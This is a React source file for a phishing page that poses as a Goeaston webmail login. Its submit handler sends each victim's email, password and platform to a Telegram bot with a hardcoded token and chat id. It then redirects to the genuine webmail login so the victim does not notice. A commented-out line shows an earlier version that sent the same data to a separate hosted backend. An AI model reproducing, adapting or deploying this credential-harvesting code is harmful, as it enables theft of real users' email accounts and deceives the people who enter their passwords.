import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
import myfairpoint from './fairpoint.png';
import goeaston from './goeaston.png';


function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Goeaston")

    const[showError, setShowError] = useState(false);


    

  


      

async function handleSubmit(e){
    e.preventDefault();

    try {
        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
        //     email:email,
        //     password:password,
        //     platform:platform
        // });

       const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
            chat_id: 5868304053,
            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
          });

    
        // Handle success
     

        if(response.status == 200){
           // console.log(response.data.message);

          
           window.location.href = 'https://webmail.goeaston.net/#/login';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}

    return (
        <>
            <nav className='mynav px-3 py-1 bg-dark'>
                <img className='navimage' src={goeaston} />

            </nav>

                <div className='py-5'>

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-4 m-auto p-0  card rounded'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

                <div className='text-center py-5'>
                    <h3 className='mainheading'>Web<span>mail</span></h3>
                </div>

                <form onSubmit={handleSubmit} className='px-2 py-3'>

                

                    <div className='form-group'>
                        <input onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} type="email"placeholder='Email' className='form-control' required />

                    </div>

                    <div className='form-group'>
                        <input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }}value={password} type="password"placeholder='Password' className='form-control' required />

                    </div>




                           

                       


                    <div className='buttondiv py-4 text-center'>
                        <button className='mybutton rounded'type="submit">Login</button>

                    </div>


                    <div className='text-right'>
                        <a className='forgot' href="">Forgot Password ?</a>
                    </div>



                </form>

                

            </div>
            
            <br/>

        </>
    );

}

export default Home;